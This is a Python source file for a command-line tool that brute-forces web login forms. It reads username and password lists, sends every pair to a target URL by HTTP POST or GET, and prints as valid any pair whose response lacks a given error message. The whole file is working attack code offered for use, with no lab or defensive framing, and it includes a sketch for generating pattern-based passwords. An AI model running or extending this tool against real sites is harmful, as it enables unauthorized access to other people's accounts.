import argparse
import requests
import sys
import string
import time

parser = argparse.ArgumentParser(description = "I developed this tool for bruteforcing...")
parser.add_argument('-e', '--error_message', help="Message if I used invalid credentials", required=True)
parser.add_argument('-f', '--first', help="Stop on first n values of valid credentials")
parser.add_argument('-i', '--ip', help="URL for bruteforcing", required=True, type=str)
parser.add_argument('-k', '--keys', help="Keys (for example, username,password) from source code", required=True)
parser.add_argument('-m', '--method', help="Set method gor attack", required=True)
parser.add_argument('-p', '--password', help="Password for authentication", type=str)
parser.add_argument('-P', '--passwords', help="List with passwords for attack")
parser.add_argument('-t', '--threads', help="Enter count threads for bruteforcing", default=1)
parser.add_argument('-u', '--username', help="Username for authentication", type=str)
parser.add_argument('-U', '--usernames', help="List with usernames for attack")
parser.add_argument('-v', '--verbose', help="Start verbose mode", default=False)
args = parser.parse_args()

# Добавить обработку потоков, ssl/tls
# Добавить обработку большего количества параметров
# Добавить подробный режим

# Набросок для по шаблонам
'''
passwords = []
for i in range(1000):
    password = str(i).zfill(3)
    for letter in string.ascii_uppercase:
        passwords.append(password + letter)
'''

class Bruteforcer:
    def __init__(self):
        self.url = args.ip
        self.method = args.method
        self.threads = args.threads
        self.keys = args.keys.split(",")
        self.error = args.error_message
        self.verbose = args.verbose
        self.first = args.first

        if args.username == None and args.usernames != None:
            with open(args.usernames, "r") as file:
                self.usernames = []
                for user in file.readlines():
                    self.usernames.append(user.strip())
        elif args.username != None and args.usernames == None:
            self.usernames = [args.username]
        elif args.username != None and args.usernames != None:
            print ("[*] You want to use -u and -U options both.You need to choose: username (-u option) of file with usernames (-U option).")
            sys.exit()
        else:
            print ("[*] You need to specify -u or -U option.")
            sys.exit()

        if args.password == None and args.passwords != None:
            with open(args.passwords, "r") as file:
                self.passwords = []
                for passwd in file.readlines():
                    self.passwords.append(passwd.strip())
        elif args.password != None and args.passwords == None:
            self.passwords = [args.password]
        elif args.password != None and args.passwords != None:
            print ("[*] You want to use -p and -P options both.You need to choose: password (-p option) of file with passwords (-P option).")
            sys.exit()
        else:
            print ("[*] You need to specify -p or -P option.")
            sys.exit()

    def http_post_brute(self):
        count = 0
        for username in self.usernames:
            for password in self.passwords:
                data = {self.keys[0]:username, self.keys[1]:password}
                response = requests.post(self.url, data=data)

                if self.error not in response.text and count < int(self.first):
                    print (f'[+] Found valid credentials: {username}:{password}')
                    count += 1
                elif count == int(self.first):
                    return
                else:
                    print (f'[*] Attempted: {username}:{password}')
    

    def http_get_brute(self):
        for username in self.usernames:
            for password in self.passwords:
                response = requests.get(f"{self.url}?{self.keys[0]}={username}&{self.keys[1]}={password}")
            
                if self.error not in response.text:
                    print (f'[+] Found valid credentials: {username}:{password}')
                    return
                else:
                    print (f'[*] Attempted: {username}:{password}')


    def start_scan(self):
        if self.method == 'http_post':
            self.http_post_brute() 
        elif args.method == 'http_get':
            self.http_get_brute()
        else:
            pass

if __name__ == "__main__":
    bruteforcer = Bruteforcer()
    bruteforcer.start_scan()
